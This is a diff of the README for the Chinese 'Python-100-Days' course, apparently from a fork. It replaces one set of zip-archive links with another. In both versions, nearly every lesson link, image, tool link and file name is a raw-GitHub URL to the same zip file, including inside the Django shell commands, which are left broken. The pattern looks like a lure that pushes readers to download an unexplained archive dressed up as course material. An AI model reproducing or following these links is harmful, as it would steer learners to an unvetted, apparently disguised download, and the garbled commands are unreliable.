@@ -2,11 +2,11 @@
 
 > **作者**：骆昊
 >
-> **说明**：从项目上线到获得8w+星标以来，一直收到反馈说基础部分（前15天的内容）对新手来说是比较困难的，建议有配套视频进行讲解。最近把基础部分的内容重新创建了一个名为[“Python-Core-50-Courses”](<https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip>)的项目，**用更为简单通俗的方式重写了这部分内容并附带了视频讲解**，初学者可以关注下这个新项目。国内用户如果访问GitHub比较慢的话，也可以关注我的知乎号[Python-Jack](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)上的[“从零开始学Python”](<https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip>)专栏，专栏会持续更新，还有大家比较期待的“数据分析”的内容也即将上线，**欢迎大家关注我在知乎的专栏、文章和回答**。
+> **说明**：从项目上线到获得8w+星标以来，一直收到反馈说基础部分（前15天的内容）对新手来说是比较困难的，建议有配套视频进行讲解。最近把基础部分的内容重新创建了一个名为[“Python-Core-50-Courses”](<https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip>)的项目，**用更为简单通俗的方式重写了这部分内容并附带了视频讲解**，初学者可以关注下这个新项目。国内用户如果访问GitHub比较慢的话，也可以关注我的知乎号[Python-Jack](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)上的[“从零开始学Python”](<https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip>)专栏，专栏会持续更新，还有大家比较期待的“数据分析”的内容也即将上线，**欢迎大家关注我在知乎的专栏、文章和回答**。
 >
 > 创作不易，感谢大家的打赏支持，这些钱基本不会用于购买咖啡，而是通过腾讯公益、美团公益、水滴筹等平台捐赠给需要帮助的人（[点击](./更新日志.md)了解捐赠情况）。需要加入QQ交流群的可以扫描下面的二维码，交流群会为大家提供**学习资源**和**问题解答**，还会持续为大家带来**免费的线上Python体验课和行业公开课**，敬请关注。
 
-![](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+![](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
 ### Python应用领域和职业发展分析
 
@@ -49,7 +49,7 @@ Python在以下领域都有用武之地。
 
 ### Day01~15 - [Python语言基础](./Day01-15)
 
-#### Day01 - [初识Python](./Day01-15/01.初识https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+#### Day01 - [初识Python](./Day01-15/01.初识https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
 - Python简介 - Python的历史 / Python的优缺点 / Python的应用领域
 - 搭建编程环境 - Windows环境 / Linux环境 / MacOS环境
@@ -165,7 +165,7 @@ Python在以下领域都有用武之地。
 - 读写Word文档 - 文本内容的处理 / 段落 / 页眉和页脚 / 样式的处理
 - 读写Excel文件 - xlrd模块 / xlwt模块
 
-### Day16~Day20 - [Python语言进阶 ](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip语言进阶.md)
+### Day16~Day20 - [Python语言进阶 ](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip语言进阶.md)
 
 - 常用数据结构
 - 函数的高级用法 - “一等公民” / 高阶函数 / Lambda函数 / 作用域和闭包 / 装饰器
@@ -173,13 +173,13 @@ Python在以下领域都有用武之地。
 - 迭代器和生成器 - 相关魔术方法 / 创建生成器的两种方式 / 
 - 并发和异步编程 - 多线程 / 多进程 / 异步IO / async和await
 
-### Day21~30 - [Web前端入门](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip前端概述.md)
+### Day21~30 - [Web前端入门](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip前端概述.md)
 
 - 用HTML标签承载页面内容
 - 用CSS渲染页面
 - 用JavaScript处理交互式行为
 - jQuery入门和提高
-- https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip入门
+- https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip入门
 - Element的使用
 - Bootstrap的使用
 
@@ -197,7 +197,7 @@ Python在以下领域都有用武之地。
 
 ### Day36~40 - [数据库基础和进阶](./Day36-40)
 
-- [关系型数据库MySQL](./Day36-40/36-38.关系型数据库https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+- [关系型数据库MySQL](./Day36-40/36-38.关系型数据库https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
   - 关系型数据库概述
   - MySQL的安装和使用
   - SQL的使用
@@ -209,14 +209,14 @@ Python在以下领域都有用武之地。
     - 数据完整性
     - 数据一致性
   - 在Python中操作MySQL
-- [NoSQL数据库入门](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip数据库入门.md)
+- [NoSQL数据库入门](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip数据库入门.md)
   - NoSQL概述
   - Redis概述
   - Mongo概述
 
 ### Day41~55 - [实战Django](./Day41-55)
 
-#### Day41 - [Django快速上手](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip快速上手.md)
+#### Day41 - [Django快速上手](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip快速上手.md)
 
 - Web应用工作机制
 - HTTP请求和响应
@@ -237,7 +237,7 @@ Python在以下领域都有用武之地。
 - Ajax概述
 - 用Ajax实现投票功能
 
-#### Day44 - [Cookie和Session](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip和https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+#### Day44 - [Cookie和Session](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip和https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
 - 实现用户跟踪
 - cookie和session的关系
@@ -267,11 +267,11 @@ Python在以下领域都有用武之地。
 #### Day48 - [前后端分离开发入门](./Day41-55/48.前后端分离开发入门.md)
 
 - 返回JSON格式的数据
-- 用https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip渲染页面
+- 用https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip渲染页面
 
-#### Day49 - [RESTful架构和DRF入门](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip架构和DRF入门.md)
+#### Day49 - [RESTful架构和DRF入门](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip架构和DRF入门.md)
 
-#### Day50 - [RESTful架构和DRF进阶](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip架构和DRF进阶.md)
+#### Day50 - [RESTful架构和DRF进阶](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip架构和DRF进阶.md)
 
 #### Day51 - [使用缓存](./Day41-55/51.使用缓存.md)
 
@@ -352,9 +352,9 @@ Python在以下领域都有用武之地。
 
 #### Day66 - [数据分析概述](./Day66-70/66.数据分析概述.md)
 
-#### Day67 - [NumPy的应用](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip的应用.md)
+#### Day67 - [NumPy的应用](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip的应用.md)
 
-#### Day68 - [Pandas的应用](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip的应用.md)
+#### Day68 - [Pandas的应用](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip的应用.md)
 
 #### Day69 - [数据可视化](./Day66-70/69.数据可视化.md)
 
@@ -378,29 +378,29 @@ Python在以下领域都有用武之地。
 
 #### Day78 - [深度学习入门](./Day71-85/78.深度学习入门.md)
 
-#### Day79 - [Tensorflow概述](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip概述.md)
+#### Day79 - [Tensorflow概述](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip概述.md)
 
-#### Day80 - [Tensorflow实战](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip实战.md)
+#### Day80 - [Tensorflow实战](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip实战.md)
 
-#### Day81 - [Kaggle项目实战](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip项目实战.md)
+#### Day81 - [Kaggle项目实战](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip项目实战.md)
 
 #### Day82 - [天池大数据项目实战](./Day71-85/82.天池大数据项目实战.md)
 
-#### Day83 - [推荐系统实战-1](./Day71-85/83.推荐系统实战https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+#### Day83 - [推荐系统实战-1](./Day71-85/83.推荐系统实战https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
-#### Day84 - [推荐系统实战-2](./Day71-85/84.推荐系统实战https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+#### Day84 - [推荐系统实战-2](./Day71-85/84.推荐系统实战https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
-#### Day85 - [推荐系统实战-3](./Day71-85/85.推荐系统实战https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+#### Day85 - [推荐系统实战-3](./Day71-85/85.推荐系统实战https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
 ### Day86~90 - [大数据分析概述](./Day86-90)
 
 #### Day86 - [大数据概述](./Day86-90/86.大数据概述.md)
 
-#### Day87 - [Hive查询](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip查询.md)
+#### Day87 - [Hive查询](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip查询.md)
 
-#### Day88 - [PySpark和离线数据处理](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip和离线数据处理.md)
+#### Day88 - [PySpark和离线数据处理](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip和离线数据处理.md)
 
-#### Day89 - [Flink和流式数据处理](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip和流式数据处理.md)
+#### Day89 - [Flink和流式数据处理](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip和流式数据处理.md)
 
 #### Day90 - [大数据分析项目实战](./Day86-90/90.大数据分析项目实战.md)
 
@@ -433,7 +433,7 @@ Python在以下领域都有用武之地。
      > - **客户合作** 高于 合同谈判
      > - **响应变化** 高于 遵循计划
 
-     ![](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+     ![](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
      > 角色：产品所有者（决定做什么，能对需求拍板的人）、团队负责人（解决各种问题，专注如何更好的工作，屏蔽外部对开发团队的影响）、开发团队（项目执行人员，具体指开发人员和测试人员）。
 
@@ -449,11 +449,11 @@ Python在以下领域都有用武之地。
 
      > 说明：谢谢**付祥英**女士帮助我绘制了下面这张精美的公司组织架构图。
 
-     ![company_architecture](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+     ![company_architecture](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
    - 编程规范和代码审查（flake8、pylint）
 
-     ![](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+     ![](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
    - Python中的一些“惯例”（请参考[《Python惯例-如何编写Pythonic的代码》](Python惯例.md)）
 
@@ -465,9 +465,9 @@ Python在以下领域都有用武之地。
 
 3. 团队开发工具介绍
    - 版本控制：Git、Mercury
-   - 缺陷管理：[Gitlab](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)、[Redmine](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
-   - 敏捷闭环工具：[禅道](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)、[JIRA](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
-   - 持续集成：[Jenkins](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)、[Travis-CI](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+   - 缺陷管理：[Gitlab](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)、[Redmine](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
+   - 敏捷闭环工具：[禅道](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)、[JIRA](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
+   - 持续集成：[Jenkins](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)、[Travis-CI](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
    请参考[《团队项目开发的问题和解决方案》](Day91-100/91.团队项目开发的问题和解决方案.md)。
 
@@ -487,7 +487,7 @@ Python在以下领域都有用武之地。
    - 模块划分：画思维导图（XMind），每个模块是一个枝节点，每个具体的功能是一个叶节点（用动词表述），需要确保每个叶节点无法再生出新节点，确定每个叶子节点的重要性、优先级和工作量。
    - 任务分配：由项目负责人根据上面的指标为每个团队成员分配任务。
 
-   ![](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+   ![](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
 3. 制定项目进度表（每日更新）
 
@@ -502,26 +502,26 @@ Python在以下领域都有用武之地。
 
   - UML（统一建模语言）的类图
 
-    ![uml](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+    ![uml](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
   - 通过模型创建表（正向工程）
 
     ```Shell
-    python https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip makemigrations app
-    python https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip migrate
+    python https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip makemigrations app
+    python https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip migrate
     ```
 
   - 使用PowerDesigner绘制物理模型图。
 
-    ![](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+    ![](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 
   - 通过数据表创建模型（反向工程）
 
     ```Shell
-    python https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip inspectdb > https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip
+    python https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip inspectdb > https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip
     ```
 
-#### 第92天：[Docker容器详解](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip容器详解.md)
+#### 第92天：[Docker容器详解](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip容器详解.md)
 
 1. Docker简介
 2. 安装Docker
@@ -530,7 +530,7 @@ Python在以下领域都有用武之地。
 5. 容器编排（Docker-compose）
 6. 集群管理（Kubernetes）
 
-#### 第93天：[MySQL性能优化](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip性能优化.md)
+#### 第93天：[MySQL性能优化](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip性能优化.md)
 
 #### 第94天：[网络API接口设计](./Day91-100/94.网络API接口设计.md)
 
@@ -547,13 +547,13 @@ Python在以下领域都有用武之地。
 ##### REST API设计
 
 1. RESTful架构
-   - [理解RESTful架构](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
